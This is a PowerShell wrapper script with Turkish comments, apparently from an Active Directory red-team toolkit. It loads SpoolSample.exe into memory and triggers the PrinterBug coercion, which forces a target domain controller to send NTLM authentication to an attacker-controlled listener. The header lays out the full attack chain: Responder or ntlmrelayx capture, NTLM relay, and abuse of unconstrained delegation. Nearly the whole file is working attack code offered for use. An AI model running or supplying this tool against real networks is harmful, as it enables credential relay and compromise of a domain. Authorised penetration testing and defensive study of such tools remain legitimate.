<#
.SYNOPSIS
    SpoolSample.exe'yi PowerShell üzerinden in-memory çalıştırır.

.DESCRIPTION
    SpoolSample (PrinterBug), MS-RPRN (Print Spooler) servisi üzerinden
    hedef makinenin authentication'ını saldırgan makineye yönlendirir.

    Saldırı zinciri:
    1. Saldırgan makinede bir listener başlatılır (ntlmrelayx, Responder vb.)
    2. SpoolSample hedef DC'ye bağlanır
    3. DC, Print Spooler servisi üzerinden saldırgan makineye NTLM auth yapar
    4. Bu auth yakalanır/relay edilir

    Bu saldırı özellikle Unconstrained Delegation abuse ve
    NTLM Relay senaryolarında kullanılır.

.PARAMETER Command
    SpoolSample'a geçirilecek komut. Format: "target listener"

.PARAMETER ExePath
    SpoolSample.exe dosyasının yolu.

.EXAMPLE
    # DC01'i saldırgan makineye yönlendir
    Invoke-SpoolSample -Command "DC01.domain.local ATTACKER01.domain.local"

.EXAMPLE
    # IP adresleri ile
    Invoke-SpoolSample -Command "10.0.0.1 10.0.0.5"

.NOTES
    Orijinal Araç: SpoolSample by Lee Christensen (@tifkin_)
    Wrapper: AD Red Team PowerShell Toolkit
    Gereksinim: Hedef makinede Print Spooler servisi çalışıyor olmalı
    Kontrol: Get-Service -Name Spooler -ComputerName TARGET
#>

function Invoke-SpoolSample {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0,
                   HelpMessage = "Format: 'target listener' (örn: 'DC01.domain.local ATTACKER01.domain.local')")]
        [string]$Command,

        [Parameter(Mandatory = $false)]
        [string]$ExePath
    )

    if (-not $ExePath) {
        $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        $ExePath = Join-Path (Split-Path -Parent $scriptDir) "SpoolSample.exe"
    }

    if (-not (Test-Path $ExePath)) {
        Write-Error "[!] SpoolSample.exe bulunamadı: $ExePath"
        return
    }

    $parts = $Command.Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
    if ($parts.Count -lt 2) {
        Write-Error "[!] Kullanım: Invoke-SpoolSample -Command 'TARGET LISTENER'"
        Write-Error "[!] Örnek: Invoke-SpoolSample -Command 'DC01.domain.local ATTACKER01.domain.local'"
        return
    }

    $target = $parts[0]
    $listener = $parts[1]

    # Ön kontrol: Print Spooler servisi
    Write-Host "[*] Hedef: $target → Listener: $listener" -ForegroundColor Cyan
    Write-Host "[*] Not: Hedefte Print Spooler servisinin çalıştığından emin olun." -ForegroundColor Yellow
    Write-Host "[*] Kontrol: Get-Service -Name Spooler -ComputerName $target" -ForegroundColor Yellow
    Write-Host "[*] SpoolSample.exe yükleniyor: $ExePath" -ForegroundColor Cyan

    try {
        $bytes = [System.IO.File]::ReadAllBytes($ExePath)
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Write-Host "[+] Assembly belleğe yüklendi." -ForegroundColor Green

        Write-Host "[*] PrinterBug tetikleniyor..." -ForegroundColor Cyan
        Write-Host ("-" * 60) -ForegroundColor DarkGray

        $originalOut = [Console]::Out
        $stringWriter = New-Object System.IO.StringWriter
        [Console]::SetOut($stringWriter)

        try {
            $assembly.EntryPoint.Invoke($null, @(,[string[]]$parts))
        }
        catch [System.Reflection.TargetInvocationException] {
            if ($_.Exception.InnerException) {
                Write-Warning "SpoolSample exception: $($_.Exception.InnerException.Message)"
            }
        }
        finally {
            [Console]::SetOut($originalOut)
        }

        $output = $stringWriter.ToString()
        if ($output) { Write-Host $output }
        Write-Host ("-" * 60) -ForegroundColor DarkGray
        Write-Host "[+] SpoolSample tamamlandı. Listener'ı kontrol edin." -ForegroundColor Green
    }
    catch {
        Write-Error "[!] Hata: $($_.Exception.Message)"
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    if ($args.Count -gt 0) {
        Invoke-SpoolSample -Command ($args -join ' ')
    }
}
